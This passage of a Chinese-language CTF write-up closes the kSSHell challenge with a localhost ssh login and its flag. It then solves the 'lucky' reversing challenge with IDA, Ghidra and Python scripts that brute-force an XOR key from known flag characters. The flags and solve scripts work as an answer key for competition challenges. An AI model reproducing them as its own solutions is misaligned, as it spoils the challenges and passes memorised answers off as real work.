style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003essh kShell@localhost -p \u003cspan style=\"color:#ae81ff\"\u003e2222\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然後 ssh 就成功登進去了，flag 找一下。\u003c/p\u003e\n\u003cp\u003eflag: \u003ccode\u003eBALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"lucky\"\u003elucky\u003c/h2\u003e\n\u003cp\u003e他給一個執行檔，跑起來會卡住。 string 一下\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/36acc2e3-3b8c-4708-a58d-79ae679a736c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後用 IDA 開查一下 \u003ccode\u003eLucky! flag is %s\u003c/code\u003e 的位置。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/20589c7f-20fc-46d1-8242-7ec25b10bb68\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後直接解壞給我看\u0026hellip;\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/c9dfc48b-31ae-44e0-8f91-bd6d73216625\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e用 Ghidra 開\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/1a5e83c2-520a-4517-b6d5-f701849f635b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e太棒了沒解壞\n讀一下看起來是會先進到一個跑 10000000000000000 次的迴圈，裡面每次都會生兩個 uint 隨機數 % 100000000 以後再開平方並加起來檢查是否 \u0026gt; 9999999999999999 如果是的話就把 \u003ccode\u003eIVar4\u003c/code\u003e - 1 ，然後每個迴圈都會做一次 + 1 （其實本質上還是生成隨機數）。\n離開迴圈後，把這個數 * 4 + -30000000000000000 然後轉字串接著將位置在 0x498040 ~ 0x498067 的資料與這個數字字串做 xor 就能得到 Flag 了（雖說這樣講但到頭來那個數字還是得用猜的）。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/9c065411-9445-4091-9235-fbe4903282fa\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e雖然要猜，但是一些部分還是有跡可循，首先數字字串並沒有 0x28 那麼長，xor 的過程中 index 到 0xf 就會回到 0x0 了所以一定有些部分是用一樣的數字然後 flag 是 BALSN{printable+} 所以我們可以用前面 \u003ccode\u003eBALSN{\u003c/code\u003e 跟後面 \u003ccode\u003e}\u003c/code\u003e 取得那個位置的數字，接著找其他也用這個數字的位置換成 flag 我們就可以得出這個。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x73\\x75\\x7D\\x66\\x77\\x49\\x5A\\x60\\x50\\x7E\\x67\\x08\\x44\\x66\\x40\\x02\\x5E\\x7B\\x01\\x7A\\x66\\x03\\x5B\\x65\\x03\\x47\\x0F\\x0D\\x59\\x4D\\x6C\\x5B\\x7F\\x6B\\x52\\x02\\x7F\\x13\\x15\\x48\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprefix \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;BALSN{\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeck \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeck \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(data)):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e prefix[a] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        check[a \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e prefix[a] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[a]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echeck \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eans \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(data)):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e check[a \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ans \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e bytes([check[a \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[a]])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ans \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(ans)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/831deb54-e3d8-4db6-9dc8-c8a44cf2688c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後未知的部分我們可以用爆的看看，首先找到未知的位置從 0~9 測一次會不會出現 printable 的字元如果有我們再用相同的數字測看看用同樣數字 index 的其他位置是不是有 printable 的字元，然後把所有符合規則的可能印出來。但是因為這個可能還是很龐大，所以我們可以先把 printable 的字元 list 縮小一下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#printable = b\u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\\\]^_`{|}~\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprintable \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x73\\x75\\x7D\\x66\\x77\\x49\\x5A\\x60\\x50\\x7E\\x67\\x08\\x44\\x66\\x40\\x02\\x5E\\x7B\\x01\\x7A\\x66\\x03\\x5B\\x65\\x03\\x47\\x0F\\x0D\\x59\\x4D\\x6C\\x5B\\x7F\\x6B\\x52\\x02\\x7F\\x13\\x15\\x48\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprefix \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;BALSN{\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egetans\u003c/span\u003e(check):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ans \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(data)):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e check[a \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ans \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e bytes([check[a \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[a]])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ans \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(ans)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrycheck\u003c/span\u003e(check, index):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    check \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e prefix[index] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        check[index \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e prefix[index] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[index]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e len(data):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            trycheck(bytes(check), index\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e int((int(bytes(check)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30000000000000000\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e             int(bytes(check)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30000000000000000\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            getans(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e check[index \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e len(data):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            trycheck(bytes(check), index\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e int((int(bytes(check)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30000000000000000\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e             int(bytes(check)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30000000000000000\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            getans(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e bytes([ord(str(a)) \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[index]]) \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e printable \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e               bytes([ord(str(a)) \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[index \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x10\u003c/span\u003e]]) \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e printable \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e               (index \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e len(data) \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e               bytes([ord(str(a)) \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data[index \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e]]) \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e printable):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                check[index \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ord(str(a))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e index \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e len(data):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    trycheck(bytes(check), index\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e int((int(bytes(check)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30000000000000000\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                     int(bytes(check)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode()) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e30000000000000000\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    getans(check)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echecktmp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etrycheck(checktmp, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然後把一些看起來從頭到尾沒變過的濾出來得到 \u003ccode\u003eb'BALSN{nU\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00oO0O_1oP\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00N_c7F!!}'\u003c/code\u003e\n然後更新一下 \u003ccode\u003eprefix\u003c/code\u003e 再測一次，這次再跑完以後翻找出一個看起來有比較多合理單字的 flag 得到：\n\u003ccode\u003eb'BALSN{nUdK_1s_s0oO0O_1oP7r74nt_iN_c7F!!}'\u003c/code\u003e\n然後把不太像的字元拔掉\n\u003ccode\u003eb'BALSN{nU\\x00\\x00_1s_s0oO0O_1oP\\x00\\x00\\x00\\x00\\x00\\x00_iN_c7F!!}'\u003c/code\u003e\n更新一下 \u003ccode\u003eprefix\u003c/code\u003e 再測一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/62752e70-9ba5-4c0a-9b23-3b86620d12d8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這次的結果數量就少很多，可以試著把 printable 的字元增加一些或全部使用。\n執行後看起來還是沒有合理的單字，可能是有單字是錯的，所以把不太像的字元拔掉\n\u003ccode\u003eb'BALSN{\\x00\\x00\\x00\\x00_1s_s0oO0O_1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00_iN_c7F!!}'\u003c/code\u003e\n更新一下 \u003ccode\u003eprefix\u003c/code\u003e 再測一次，結果一樣，再刪，這次刪最後面的 \u003ccode\u003e!\u003c/code\u003e 看看。\n\u003ccode\u003eb'BALSN{\\x00\\x00\\x00\\x00_1s_s0oO0O_1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00_iN_c7F!\\x00}'\u003c/code\u003e\n更新一下 \u003ccode\u003eprefix\u003c/code\u003e 再測一次，結果中有一部份的結果最前面的單字是 \u003ccode\u003elUcK\u003c/code\u003e 符合這個題目的主題，因此得到\n\u003ccode\u003eb'BALSN{lUcK_1s_s0oO0O_1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00_iN_c7F!\\x00}'\u003c/code\u003e\n更新一下 \u003ccode\u003eprefix\u003c/code\u003e 再測一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/88dc842a-fa0a-483c-9afd-ec1be6a48aee\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e看起來都合理的單字且能組成一個句子。\u003c/p\u003e\n\u003cp\u003eflag: \u003ccode\u003eBALSN{lUcK_1s_s0oO0O_1mP0r74nt_iN_c7F!#}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 